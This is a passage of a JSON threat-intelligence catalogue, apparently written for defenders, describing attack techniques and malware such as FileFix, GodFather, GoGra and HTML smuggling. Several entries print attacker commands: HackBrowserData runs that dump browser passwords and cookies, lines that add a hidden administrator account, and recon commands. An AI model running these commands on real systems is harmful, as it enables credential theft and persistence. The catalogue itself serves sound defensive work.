                "description": "The `FileFix` technique is a new social engineering method similar to\n`ClickFix` attack. `FileFix` is used by the threat actors to abuse Windows\nExplorer and execute malicious commands on a compromised system. This\ntechnique takes advantage of the Windows Explorer feature that allows users\nto specify a custom executable to open a file with. The goal of this\ntechnique is to harvest user's credentials. Threat actor can execute\ncommands through the user's Windows Explorer and deploy further a loader\nwhich drops infostealer, harvesting browsers, wallets and cloud credentials\nref [1],[2].\n\nUnlike `ClickFix`, which tricks users into running malicious commands via\nthe Windows Run dialog, `FileFix` takes a subtler approach: A malicious\nwebpage will open a legitimate File Explorer window while covertly copying\na disguised PowerShell one-liner into the clipboard. The user is then asked\nto paste into the Explorer address bar (or otherwise paste into a UI), and\nthe pasted content runs in the user context, often invoking PowerShell to\ndownload and execute follow-on payloads ref [1].  \n\n### How FileFix Works\n\n- User Interaction: The attack typically begins when a user is lured to a  compromised website that prompts them to perform actions that seem benign,   such as opening File Explorer to access a shared document.\n- Clipboard Manipulation: The website uses JavaScript to copy a malicious  PowerShell command to the clipboard while simultaneously opening a File  Explorer window.\n- Execution: The user is instructed to paste the clipboard content into the  File Explorer address bar, which leads to the execution of the malicious  command.\n\nTo the victims, this process appears to be a simple task of opening a shared\nfile or folder, making it feel routine and safe. This subtle manipulation\nmakes `FileFix` a more stealthy and potentially more dangerous evolution of\nthe `ClickFix` social engineering attack. \n"
            },
            "f79a55a2-95bf-446d-a667-1bcf00f1b9f1": {
                "name": "Files retrieved via SMB connection",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "\n### The SMB Protocol\nSMB stands for Server Message Block. It is a network protocol used to \nshare data between computers and devices on a local or wide area network. \nThe protocol allows local network computers to interact with file shares.\n\nThreat actors frequently exploit SMB for their nefarious activities. \nOne common tactic involves leveraging SMB to interact with file shares, including Microsoft Sharepoints, OneDrive or some NAS servers. \nIn doing so, adversaries can pull malicious files from compromised endpoints, \npaving the way for the execution of additional malicious code. \nThis method poses a significant threat, as it allows for the clandestine transfer of harmful files between systems, \nthereby supporting lateral movement within the network. \nThreat actors may exploit inherent file sharing protocols like SMB/Windows Admin Shares, \neither to connected network shares or through authenticated connections via Remote Desktop Protocol.\n\nMoreover, the embedding of files can serve as a vector for initiating SMB connections. \nFor instance, embedded files containing links executed by Office applications may establish \nconnections with SMB servers under the threat actor's control. This technique allows threat actors to exploit unsuspecting users, \ninitiating SMB connections that may lead to the execution of malicious code.\n\nIn a more advanced scenario, threat actors might specify a malicious server, \ndirecting the SMB protocol to facilitate further code execution. \nThis strategic move enables them to retrieve various types of files, potentially leading to widespread infection across entire machines within the network. \nThe ability to specify a malicious server amplifies the threat, \nas it allows threat actors to exercise greater control over the execution and distribution of harmful payloads, posing a severe risk to the overall security of the network.\n"
            },
            "6e988fa7-69c9-4aef-897c-a34fa5066dac": {
                "name": "Ghost logins attempts",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Ghost logins is a technique that exploits the fact that SaaS user accounts\noften enable multiple simultaneous logins using different sign-in methods. \n\nGhost logins can be used for both the initial access and persistence stages of\na cyber attack, doubling up as a defense evasion technique because of low login\nmethod visibility.\n\nFor initial access, the technique exploits the fact that local and SSO logins\ncan exist simultaneously. Given that many apps are self-adopted by users, it is\nlikely that many users will default to a local username and password login at \nthis stage. If the app is later adopted companywide and brought into SSO,\nthe original local login will continue to exist unless explicitly disabled or deleted.\n\nBecause MFA is applied at the app and IdP level independently, it is possible to\nend up with an SSO login that requires MFA (via the IdP login), but a local\nlogin that does not. This creates an easy target identity for attackers to look for.\n\nWhen combined with other identity vulnerabilities such as weak, breached, and/or\nreused passwords, attackers can easily automate ghost login discovery and\nexploitation at scale.  \n\nGhost logins can also be created after an attacker has established access to an app.\nFor example, if a social login is used to access an account, an adversary may be \nable to configure a separate username/password login, or even connect a second\nsocial account that the adversary controls.\n\nIf the account has sufficient privileges, it may also be possible to set up or\nchange the SAML login settings to inject a malicious URL, for example to an\nattacker controlled tenant.\n"
            },
            "46a79e6f-3df1-4332-a452-3f1fe83bdaf3": {
                "name": "GodFather Banking Trojan",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "The GodFather malware is a highly advanced Android banking trojan that has evolved \ninto one of the most effective and disruptive mobile threats targeting financial, \nbanking, and cryptocurrency applications globally.\n\n### Main Threat Vectors\n\n- **On-Device Virtualization**: GodFather\u2019s core tactic is deploying a virtualization \nframework on infected Android devices. It creates a virtual environment into which \nit loads real banking or crypto apps. When a legitimate app is launched, the user \nis redirected invisibly to the app\u2019s clone running inside the sandbox, allowing \nthe malware to monitor every action, tap, and credential input in real-time.\n- **Overlay Attacks**: Beyond virtualization, GodFather can also display fake overlays \nthat look identical to lock screens or login pages, capturing PINs, patterns, or \npasswords as users enter them, further compromising device and account security.\n- **Hooking and Network Interception**: The malware uses the Xposed framework to \nhook into the OkHttp network library, which is utilized by many Android apps, thus \nlogging network requests and credentials.\n\n### Infection and Evasion\n\n- **Infection Chain**: Typically distributed as trojanized or impersonated apps \n(e.g., fake music downloaders or bogus \u201cGoogle Protect\u201d apps), GodFather prompts \nusers to grant invasive permissions for storage, SMS, contacts, and especially accessibility \nservices.\n- **Bypassing Security**: It employs advanced ZIP manipulation and code shifting \nto the Java layer to bypass static analysis tools. It also hooks Android APIs such \nas `getEnabledAccessibilityServiceList` to hide from anti-malware scans.\n- **Command Capabilities**: Once active, it supports a broad command set for attackers, \nincluding remote control to simulate gestures, manipulate settings, execute overlay \nattacks, log keystrokes, and exfiltrate a wide range of sensitive data.\n\n### Targets and Impact\n\n- **Scope**: GodFather targets over 484 of the world\u2019s most popular financial and \ncryptocurrency apps, with campaigns observed in Europe, the U.S., Canada, Asia, \nand the Middle East.\n- **Consequences**: It can lead to severe financial loss, reputational damage, operational \ndisruption, and regulatory fines for both consumers and organizations. The malware \nis particularly dangerous in BYOD enterprise environments, as it can compromise \ncorporate data if personal devices are infected.\n- **Stealth**: The virtualization attack results in \u201cperfect deception,\u201d as users \ninteract with their real apps, making visual or user-driven detection virtually \nimpossible.\n"
            },
            "f2c59a8e-3b1f-4a99-80f0-3675b8c1f184": {
                "name": "GoGra backdoor",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "GoGra or also known as Trojan.Gogra is a newly discovered backdoor,\ndeployed against a media organization in South Asia in November 2023.\nWritten in Go, it uses the Microsoft Graph API to communicate with a\nCommand and Control server hosted on Microsoft mail services ref [1].  \n\nIts authentication is managed via OAuth access tokens. GoGra is configured\nto read messages from an Outlook account with the username \"FNU LNU\" whose\nsubject line begins with \"Input\". It decrypts the content using AES-256 in\nCipher Block Chaining (CBC) mode, with a specific key. The malware can\nexecute commands via cmd.exe and supports a \"cd\" command to change\ndirectories ref [1, 3].        \n\nAfter the command execution, the output is encrypted and sent back to the\nOutlook account with the subject \"Output\". GoGra is believed to be\ndeveloped by a nation-state-backed group known for targeting South Asian\norganizations.      \n\nGoGra is functionally similar to another known tool used by the same threat\nactor called Graphon, written in .NET. Aside from the different programming\nlanguages used, Graphon is using a different AES key and didn't contain an\nextra \u201ccd\u201d command as well as haven't a hardcoded Outlook username to\ncommunicate with. The username instead is received directly from the\nC&C server ref [3].  \n"
            },
            "3f0b4b8e-6017-406a-9461-740d542d0917": {
                "name": "Google Calendar service as C2",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "In some of the reports and analysis a Chinese-affiliated threat actor was\nobserved abusing Google Calendar to deliver malware and establish Command\nand Control (CnC) communication.  \n\n### Abuse of Google calendar\n\nA malware delivered payload has the capability to read and write events with\nan attacker-controlled Google calendar. Once executed, this malware creates\na zero minute calendar event at a hardcoded date, with data collected from\nthe compromised host being encrypted and written in the calendar event\ndescription.  \n\nA threat operator places encrypted commands in calendar events on this date\nand next one day, which are predetermined dates also hardcoded into the\nmalware. The malicious code then begins polling calendar for these events.\nWhen an event is retrieved, the event description is decrypted and the\ncommand it contains is executed on the compromised host. Results from the\ncommand execution are encrypted and written back to another calendar event\nref [1]. \n\nIn several steps below is represented the threat vector pattern how the\nthreat actor manages to exploit a Google calendar ref [1]. \n\n- Initial access : The threat actor gains initial access to a victim's\nGoogle account, often through phishing or credential reuse.\n- Google calendar creation: As a next step the malicious actor creates\na new Google Calendar event, which is used as a mechanism to deliver\nmalware to the victim's device.\n- Malicious event creation: The threat actor creates a new event in the\nvictim's Google calendar, which includes a malicious link or attachment.\nThe event is often titled with a misleading or innocuous name to avoid\nsuspicion.\n- Notification and delivery: When the event is created, Google calendar\nsends a notification to the victim's device, which includes the malicious\nlink or attachment. If the victim interacts with the notification,\nthe malware is delivered to their device.\n- CnC Communication: Once the malware is installed, the threat actor\nuses the compromised device to establish CnC communication. The malware\ncommunicates with the threat actor's command and control server, allowing\nthem to issue commands, exfiltrate data, and further compromise the\nvictim's network.  \n\nWhere\n\n- C2 server - is the attacker controlled calendar. C2 commands are passed as\nencrypted google calendar events.\n- C2 communication - established from the agent to the attacker controlled\ngoogle calendar over HTTPS to Google API, using valid credentials.\n- C2 agent - posts computer information into the attacker controlled google\ncalendar. \n\nMore detailed explanation is provided in ref [1].  \n\n### Used known tactics\n\n- Event titles and descriptions: A Chinese-based threat actor group uses\nmisleading event titles and descriptions to avoid suspicion and increase\nthe likelihood of the victim interacting with the malicious event.\n- Malicious links and attachments: The threat actor uses malicious links or\nattachments in the event to deliver malware to the victim's\ndevice.\n- Calendar settings abuse: The threat actor configures the Google calendar\nsettings to send notifications to the victim's device, ensuring that the\nmalware is delivered even if the victim doesn't actively check their\ncalendar.\n\nBy abusing Google calendar, the threat actor is able to deliver malware and\nestablish CnC communication in a way that is difficult to detect and block.\nThis tactic highlights the importance of monitoring cloud services and\nimplementing robust security controls to prevent such attacks ref [1], [2].  \n"
            },
            "662af2da-7017-4899-88fc-e77617a15130": {
                "name": "Grager backdoor",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "A previously unseen backdoor named Grager was deployed against three\norganizations in the past - Taiwan, Hong Kong, and Vietnam in April\n2024. Trojan.Grager is a second APT malware implant leveraging the\nMicrosoft Graph API from a multi-step malware campaign abusing\ncloud services ref [1, 2].  \n\nThe analysis of the backdoor revealed that it used the Graph\nAPI to communicate with a C&C server hosted on Microsoft OneDrive.\nGrager was downloaded from a typosquatted URL mimicking an open-\nsource file archiver 7-Zip (7 zip .msi file) ref [1].  \n\nThe .msi dropper, is a Trojanized 7-Zip installer that installs\nthe real 7-Zip software into the Windows Program Files folder\n(C:\\Program Files (x86)\\7-Zip) along with a malicious DLL named\n`epdevmgr.dll`, a copy of the Tonerjam malware, and the encrypted\nGrager backdoor into a file named `data.dat` ref [1].   \n\nThe backdoor leverages a custom application layer protocol for\ncommunication with its command and control server, allowing it to bypass\ntraditional network security tools and evade detection. Grager employs\nvarious stealth techniques, such as obfuscation and anti-analysis methods,\nto evade antivirus software and remain undetected.  \n"
            },
            "5238718b-13c4-46d7-a84c-d29c77e5d801": {
                "name": "GSM interception",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "GSM interception refers to the unauthorized capture and monitoring of communications \n(calls, SMS, and sometimes data) transmitted over GSM (Global System for Mobile Communications) \nnetworks. This threat vector exploits inherent weaknesses in the GSM protocol, outdated \nencryption algorithms, and the ability to impersonate legitimate network infrastructure.\n\n## How GSM interception works\n\n**Key Techniques:**\n\n- **IMSI Catchers (Fake Base Stations):** Attackers deploy rogue base stations \n(often called IMSI catchers or Stingrays) that mimic legitimate cell towers. Mobile \ndevices in the vicinity connect to these fake towers, allowing attackers to capture \nthe International Mobile Subscriber Identity (IMSI), track users, and intercept communications.\n\n- **Weak Encryption Algorithms:** Early GSM encryption standards, such as A5/1 and \nA5/2, are now considered weak and can be cracked with modest resources. Attackers \ncan eavesdrop on calls and SMS by decrypting intercepted radio signals.\n\n- **Man-in-the-Middle (MitM) Attacks:** By placing themselves between the mobile \ndevice and the legitimate network, attackers can intercept, alter, or inject communications, \noften without the user\u2019s knowledge.\n\n- **Signaling Exploits:** Vulnerabilities in GSM\u2019s signaling protocols (like SS7) \ncan be abused to redirect calls or SMS messages to an attacker, enabling interception \neven if the attacker is not physically near the target.\n\n## Threat impact\n\n- **Eavesdropping:** Attackers can listen to phone calls and read SMS messages, \ncompromising user privacy and potentially exposing sensitive or confidential information.\n\n- **Location Tracking:** By capturing IMSI and other identifiers, attackers can \ntrack a user\u2019s movements in real time.\n\n- **Data Manipulation:** In MitM scenarios, attackers can alter messages or inject \nmalicious content during transmission.\n\n- **Fraud and Identity Theft:** Intercepted communications can be used for social \nengineering, phishing, or unauthorized access to accounts (e.g., intercepting SMS-based \ntwo-factor authentication).\n\n## Real-world examples\n\n- **Commercial Surveillance Devices:** Commercially available devices can intercept \nGSM traffic, extract encryption keys, and monitor communications. These devices \nare used by law enforcement, intelligence agencies, and sometimes by criminals to \nconduct surveillance or steal information.\n\n- **Notorious Attacks:** There have been documented cases where attackers used GSM \ninterception to gain access to bank accounts by intercepting SMS-based authentication codes.\n"
            },
            "ba88c4a0-bf3b-46cb-b022-050ae22abce8": {
                "name": "HackBrowserData browser data export",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "HackBrowserData is a command-line tool for decrypting and exporting data\n(passwords, history, cookies, bookmarks, credit cards, download history,\nlocalStorage and extensions) from the browser. \n\nIt supports the most popular browsers on the market and runs on Windows, macOS and Linux.\n\nUsage examples:\n\n## Automatic scan of the browser on the current computer,    outputting the decryption results in JSON format and compressing as zip.\n\nPS C:\\Users\\JohnDoe\\Desktop> .\\hack-browser-data.exe -b all -f json --dir results --zip\n\nPS C:\\Users\\JohnDoe\\Desktop> ls -l .\\results\\    Directory: C:\\Users\\JohnDoe\\Desktop\\results\n\n## Run with custom browser profile folder, using the -p parameter to specify the   path of the browser profile folder.  \nPS C:\\Users\\JohnDoe\\Desktop> .\\hack-browser-data.exe -b chrome -p \"C:\\Users\\User\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\"\n\n[NOTICE] [browsingdata.go:59,Output] output to file results/chrome_creditcard.csv success  \n[NOTICE] [browsingdata.go:59,Output] output to file results/chrome_bookmark.csv success  \n[NOTICE] [browsingdata.go:59,Output] output to file results/chrome_cookie.csv success  \n[NOTICE] [browsingdata.go:59,Output] output to file results/chrome_history.csv success  \n[NOTICE] [browsingdata.go:59,Output] output to file results/chrome_download.csv success  \n[NOTICE] [browsingdata.go:59,Output] output to file results/chrome_password.csv success  \n"
            },
            "d15bff6c-b902-4975-ad3a-7a18f3026aca": {
                "name": "Hide Artifacts using NTFS File Attributes",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Threat actors are using a hiding technique to conceal malicious files,\nfolders, or other artifacts on a Windows system by leveraging the attributes\nof the NTFS file system. NTFS provides a range of attributes that can be\nused to hide or obscure files and folders, making them difficult to detect\nref [1].  \n\nThreat actors may use NTFS alternate data stream attribute to evade\ndetection and deliver binary or other files that would have been otherwise\nblocked by the security controls.\n\nThey may store malicious data or binaries in file attribute metadata instead\nof directly in files. This may be done to evade some defenses, such as\nstatic indicator scanning tools and anti-virus ref [1], [2].      \n\nAn example is to attach a binary or a DLL as an ADS to a PDF file or text\nfile that does not contain anything suspicious (decoy content) and acts just\na carrier for the malicious payload store into the ADS.\n\nIn one of the malicious campaign a Russian affiliated threat actor is\nobserved to use Alternate Data Streams (ADSes) vulnerability `CVE-2025-8088`\nfor path traversal. The attackers specially crafted the archive to\napparently contain only one benign file, while it contains many malicious\naddresses. Once a victim opens this seemingly benign file, WinRAR unpacks it\nalong with all its ADSes ref [5].  \n\n### Known Techniques used by Threat Actors\n\n- Setting attributes using the command line - a malicious operator can use  the attrib command to set attributes on files and folders.\n- Using API calls -  threat actor can use Windows API calls, such as  `SetFileAttributes` or `SetFileAttribute`, to set attributes on files and  folders.\n- Exploiting vulnerabilities - exploit vulnerabilities in software or the  operating system is another common used technique. Using these type of  vulnerabilities a threat actor can set attributes on files and folders  without being detected.        \n"
            },
            "4f0f3e9c-8d61-422c-9c13-809aa75cab59": {
                "name": "Host information gathering in Linux systems",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Host information gathering in Linux can be a part of a reconnaissance\nprocess, allowing threat actors to understand the target system details and\nconfiguration, collect valuable information and identify potential\nvulnerabilities on the host.  \n\n### Possible information gathering on Linux system\n\n- A hostname and domain name - a threat actor may use the `hostname` command  to retrieve the system's hostname and domain name.\n- IP address: usage of `ip addr` or `ifconfig` commands can retrieve the  system's IP address. The IP address of the system is a valuable piece of  information for future collection and reconnaissance activities.\n- Network interface configuration: the command `ip link` or `ifconfig` is  used to retrieve information about network interfaces, including IP  addresses, subnet masks, and default gateways.\n- Operating system and version: a threat actor can use `uname -a` or  `cat /etc/os-release` command to retrieve information about the operating  system and its version. A command like `uname` can display information  about the system, for example the kernel name, version, and the Linux  architecture.  \n- Kernel Version: with the command `uname -r` an attacker can retrieve the  kernel version of a targeted system.\n- CPU architecture: a threat actor may use the `uname -m` command to  retrieve the CPU architecture. A threat actor may also use `lscpu` on Linux  to gather CPU's capabilities like model information, number of cores,  speeds, flags, virtualisation capabilities and other CPU related  parameters ref [3]. \n- Memory and disk information: an attacker can use `-m` and `df -h` commands  to retrieve information about memory and disk usage. With other commands  like `df`, `fdisk`, or `mount` they can check the system storage and to  find the disks attached to the system ref [2], [3].  \n- Whois lookup: a threat actor can perform the command `whois` <domain_name>  to retrieve which are the registered domains in the database record on  the host.\n- Name server lookup: a threat actor can use `nslookup` on Linux to get the  information from a DNS server. It queries DNS to obtain a domain name, IP  address mapping, or any other DNS record. This coomand can be used for a  system gathering of information. \n- Environment variables: `env` or `printenv` can expose environment  variables, which might include credentials, proxy settings, or session-  related tokens useful for further exploitation.\n- Running processes and services: commands like `ps aux`, `top` can help a  threat actor to identify active processes and services, which may reveal  misconfigured applications or listening services.\n- Scheduled jobs: `crontab -l`, `cat /etc/crontab`, or reviewing  `/etc/cron.*` directories can uncover automated tasks or persistence  mechanisms.\n- Listening ports and services: `ss -tuln` or `netstat -tuln` can show  services listening on the host, along with the associated ports and  protocols.    \n### Known tools used for Linux information gathering\n\n- Nmap: A network scanning tool that can be used to gather information about  open ports and services.\n- LinEnum: A tool that can be used to gather information about Linux  systems, including user and group information.\n- Zenmap - it's a network discovery and security auditing tool\n- SPARTA - tool used in the scanning and enumeration phase of information  gathering on Linux systems. This tool can be used for network scanning and  collection of information, for example scan of IP ranges, network and  domain names ref [4]. \n"
            },
            "c7ed4fad-a58f-47da-9938-4a673526b3f4": {
                "name": "HTML smuggling technique",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "HTML smuggling is a technique used by attackers to embed a malicious\ncode within HTML files, which are then smuggled past security controls,\nsuch as firewalls, intrusion detection systems, and web application\nfirewalls. This is achieved by exploiting the way HTML files are\nprocessed by web browsers.\n\n### How HTML smuggling works?\n\nHTML smuggling uses legitimate features of HTML5 and JavaScript,\nwhich are both supported by all modern browsers, to generate malicious\nfiles behind the firewall. Specifically, HTML smuggling leverages the\nHTML5 \u201cdownload\u201d attribute for anchor tags, as well as the creation\nand use of a JavaScript Blob to put together the payload downloaded\ninto an affected device.\n\nIn HTML5, when a user clicks a link, the \u201cdownload\u201d attribute lets\nan HTML file automatically download a file referenced in the \u201chref\u201d\ntag. For example, the code below instructs the browser to download\na malicious document from its location and save it into an own\ndevice (save \u201cmalicious.docx\u201d to \u201csafe.docx\u201d) ref [1].  \n\n```html\n<a href=\"/malware/malicious.docx\" download=\"safe.docx\">Click</a>\n```\n\nIn some of the reports and analysis is mentioned that a threat actor\ncan create an HTML file that contains malicious code, such as JavaScript,\nexecutable files or other type of malicious payload, encoded in a way\nthat evades detection by security controls. The HTML file is then sent\nto the victim's web browser, which processes the file and executes the \nmalicious code. The code can be used to download and install malware,\nsteal sensitive information (PII or other data of interest, belongings\nto an organisation or a company), or in some cases to fully take control\nof the victim's system ref [2],[3].    \n\nHTML smuggling can be used for malware delivery, for example in an email\nto the end user when after execution can deploy a Trojan, RAT, a backdoor\nor other type of malware depends on the attacker's goal ref [1]. \n\n### Different types of HTML smuggling\n\nThere are several types of HTML smuggling techniques, for example:\n\n- CSS smuggling - this involves using Cascading Style Sheets (CSS) to\nembed malicious code within an HTML file.\n- JavaScript smuggling - this involves using JavaScript to embed malicious\ncode within an HTML file.\n- HTML5 smuggling - this involves using HTML5 features, such as the\n<canvas> element, to embed malicious code within an HTML file.  \n"
            },
            "cf14af27-ea36-4306-9134-8d9ccb69a617": {
                "name": "Illicit VPC peering requests",
                "model": true,
                "tlp": "clear",
                "criticality": "Low",
                "description": "Threat actors may attempt to gain initial access to EC AWS environments by\nsending a malicious/illicit VPC peering request to EC VPC administrators.\nIf the VPC administrator approves the request, the adversary would see their \nnetwork joined with the target, and be able to pivot there freely.\n\nVPC peering requests could also be used in the data exfil stage by \na threat actor using this method to send data out of an EC AWS account\nthat the threat actor controls\n\nVirtual Private Clouds, or VPCs, is a logically isolated portion of \nnetworking that AWS assigns to clients. VPC peering is a feature that allows VPCs\nliving in different accounts to be joined in a common IP space, for example to \nallow different services to communicate to each others.\n"
            },
            "c4456134-df7b-4969-b5ff-a24794996890": {
                "name": "Impersonate IT support via a spoofed phone call to deceive a victim and gain a remote access",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "IT support impersonation via spoofed phone calls is a common social\nengineering technique used by attackers to gain initial access to an\norganisation's network. This tactic is often combined with other\ntechniques, such as email flooding or phishing, to create a sense\nof urgency and legitimacy. To deceive victims, attackers may use\none of the following methids:\n\n- Use spoofed phone numbers: The threat actors can use spoofed phone\nnumbers that appear to be from the organisation's IT department or a\nlegitimate company.  \n- Create a sense of urgency: Attackers may claim that there is a critical\nissue with the victim's computer or account that requires immediate\nattention.\n- Use technical jargon: Some threat actor groups are observed to use\ntechnical terms and acronyms to sound legitimate and knowledgeable.\n- Request remote access: Attackers may ask the victim to grant remote\naccess to their computer or network, often through tools like Zoom,\nAnydesk, Any Connect, TeamViewer or Microsoft Quick Assist.    \n\n### Possible scenario\n\nThreat actor groups are targeting an organisation by gathering variety of\nuser's data, for example, employee email addresses and the IT department's\nphone number. They can flood an employee with unsolicited emails and then\nimpersonate IT support via a spoofed phone call, tricking the employee\ninto granting remote access through `Microsoft Quick Assist` ref [1].   \n\nBecause `Quick Assist` uses the RDP stack (T1021.001), the attacker gains\nan RDP session under the user's context. If the targeted users has extended\nrights, the attacker can sidesteps perimeter ACLs, and disables input\nmonitoring. A hidden admin account is added ref [1], [3]:  \n\n```\n*net user svc_updater P@ss123! /add*,\n*net localgroup administrators svc_updater /add*)\n```\n\nand a signed Hyper-V VHDX (`*windows_storage.vhdx*`) containing Cobalt\nStrike and the 3AM encryptor is transferred over SMB. Credential dumping\nfrom *lsass.exe* and *net group \"domain admins\" /DOMAIN* follow, before\nthe payload encrypts mapped drives and drops *README_3AM.txt*.  \n\nBy performing such attack, the threat actor maintains persistence and\ncan exfiltrates available data towards any server he controls.  \n"
            },
            "9e93dc4d-486b-43b7-aab7-d3a336a6a72e": {
                "name": "iOS Trojan harvesting facial recognition data",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "The GoldPickaxe Malware Analysis provides an in-depth look at the capabilities of \na new iOS Trojan named GoldPickaxe.iOS, which is part of a broader suite of malware \ndeveloped by the Chinese-speaking cybercriminal group codenamed GoldFactory.  \n\nGoldPickaxe.iOS is capable of collecting sensitive data, including facial recognition \ndata, identity documents, and SMS messages. The Android version, GoldPickaxe.Android, \nshares similar functionalities. The malware exploits AI-driven face-swapping services \nto create deepfakes, enabling unauthorized access to victims' banking accounts, \na novel technique in cyber theft.  \n\nThe initial distribution methods for GoldPickaxe.iOS include:\n\n- Apple's TestFlight platform, where they trick users to download a TestFlight  app from hxxps://testflight.apple[.]com/join/<ID>.\n\n- Use of social engineering to install a Mobile Device Management (MDM) profile on  user devices, granting them full control. At any time only one MDM profile can  be active, but to have several MDM profiles installed in the device is possible.  \n\nThe infection chain involves several steps, including receiving a link that leads \nto a fraudulent website, being prompted to install an MDM profile, and granting \nthe adversaries control over the device. Once installed, the malware can perform\nvarious malicious activities, including tracking, remote wiping, and installing\nadditional apps without the user's consent.  \n"
            },
            "777e22c5-e47d-42a2-a803-42a101dee575": {
                "name": "IP Discovery in Azure",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "IP Discovery in the context of Azure refers to an adversary\u2019s technique for identifying \nthe public IP addresses associated with Azure resources. This activity is classified \nin the Azure Threat Research Matrix (ATRM) under **reconnaissance** tactics, because \nit is often one of the first steps attackers perform to understand the accessible \nsurface of a target Azure environment.\n\n#### Attack Flow and Methodology\n\n1. **Initial Reconnaissance**  (see terrain)  The attacker needs valid credentials or otherwise access to an Azure environment   \n2. **Enumerating Resources**    Using the Azure Portal, the Azure CLI, PowerShell, or Azure REST APIs, they enumerate   resources\u2014especially focusing on Virtual Machines (VMs) and Network Interfaces (NICs).\n\n3. **Querying for IP Information**    The attacker issues read requests (such as `az network nic list`, `Get-AzNetworkInterface`,   or relevant API calls) to retrieve detailed information about NICs. Each NIC   object includes properties for associated public and private IP addresses.\n\n4. **Mapping IPs to VMs**    From the NIC information, the adversary can link public IPs back to specific   VMs or other endpoints, thereby building a map of accessible resources and potential   entry points.\n\n#### Attack Goals and Impact\n\n- **Surface Mapping:** Generate a list of exposed public IP addresses and their \nassociated Azure resources.\n- **Prioritizing Targets:** Identify potentially vulnerable endpoints for direct \nattack (RDP, SSH, web services) or for scanning later.\n- **Avoiding Detection:** Reconnaissance is \u201clow and slow\u201d\u2014often blends in with \nadministrative activity, making detection challenging unless closely monitored.\n\n#### Example Attack Scenario\n\n1. **Enumeration:**    ```  az network nic list --query \"[].{Name:name, IP:ipConfigurations[].publicIpAddress.id}\"  ```  Or use the Azure REST API to enumerate all NICs and their attached public IPs.\n\n2. **Data Correlation:**    Map discovered IPs to VMs using the relationships expressed in the Azure resource objects.\n\n3. **Follow-Up:**    The attacker now has a list of direct IPs to probe for vulnerabilities   (e.g., open RDP or SSH ports, misconfigured firewalls).\n"
            },
            "024a10fb-fc65-485b-9d7c-98a2372d75c0": {
                "name": "Jailbreak Tools for iOS",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Jailbreaking an iPhone involves bypassing Apple's security restrictions to gain \nroot access to the device, allowing users to install unauthorized apps, tweaks, \nand customizations. While this can provide enhanced functionality, it also introduces \nsignificant security risks. Below is an analysis of the threat vector associated \nwith jailbreaking tools based on the provided sources.\n\n### Jailbreaking Tools\n\nJailbreaking tools exploit vulnerabilities in iOS to remove Apple's restrictions. \nThese tools vary depending on the iOS version and device type. For example:\n- **Taurine** works for iOS 14.0\u201314.8.1.\n- **Dopamine 2.x** supports iOS 15.0\u201316.6.1 on certain devices.\n- **PaleRa1n** is used for older devices (A11 and below) running iOS 15\u201317.\n\nThese tools often leverage kernel vulnerabilities to enable capabilities such as \ntweak injection, theming, and sideloading apps.\n\n### Types of jailbreaks:\n\n1. Tethered jailbreak: Requires the device to be connected to a computer to boot into    a jailbroken state.\n\n2. Semi-tethered jailbreak: Allows the device to boot into a jailbroken state without   being connected to a computer, but may require a computer to re-jailbreak the device   after a reboot.\n\n3. Untethered jailbreak: Allows the device to boot into a jailbroken state without being   connected to a computer, and the jailbreak is preserved even after a reboot.\n\n### Security Risks of Jailbreaking\n\n1. **Exploitation of Vulnerabilities**:  - Jailbreaking tools exploit known vulnerabilities in iOS, which inherently weakens   the device's security posture. Once jailbroken, the device becomes more susceptible   to malware and unauthorized access.\n\n2. **Loss of System Integrity**:  - Jailbreaking modifies the core system files, potentially leading to instability,   crashes, or bricking of the device.\n\n3. **Exposure to Malicious Software**:  - Many jailbreak tweaks and apps are distributed outside of Apple's App Store,   increasing the risk of installing malicious software.\n\n4. **Bypassing Security Features**:  - Features like Secure Enclave and sandboxing are compromised in a jailbroken   environment, exposing sensitive data such as passwords and encryption keys.\n\n5. **No Official Support**:  - Apple does not support jailbroken devices, leaving users without official updates   or security patches.\n\n### Current Status of Jailbreak Tools\n- For newer iOS versions (iOS 17 and 18), no full jailbreak tools are publicly available \nyet. However, semi-jailbreak solutions like MisakaX and Nugget exist for limited customization.\n- Older versions (iOS 15 to 16) have stable jailbreaks like Dopamine and PaleRa1n with \ntweak support.\n"
            },
            "75415bc5-6615-487e-a69c-7a4ffc196996": {
                "name": "Lateral movement using Impacket framework",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Threat actors conduct lateral movement with valid network credentials\nobtained from credential harvesting. To conduct lateral movement more\nefficiently, they typically use modules from the publicly available\nImpacket framework ref [1].    \n\nSome of the activities during the lateral movement might be:\n\n- Enumerate the volume of a device (example: PS get-volume),   access volumes via network shares like \\\\127.0.0.1\\ADMINS$\\__  \n- Copying critical registry hives that contain password hashes  and computer information.  \n- Downloading files directly from actor-owned infrastructure  (example: cmdlet: DownloadFile)  \n- Extract both system and security event logs into operational  directory (example: Win32_NTEventlogFile cmdlet) \n\nVariety of reports and analysis show that the threat actor commonly\ndeletes files used during operational phases seen in lateral movement.\n\nIn some cases the threat actors may try to manipulate the Group Policies\nto hide their traces. For example, the registries which are related to\nthe access of the System Registries. They may also try to turn off `Audit\nobject access` for successful and failed access events. ref [2, 3]  \n"
            },
            "cc9003f7-a9e3-4407-a1ca-d514af469787": {
                "name": "Lateral movement via a compromised Teams account",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
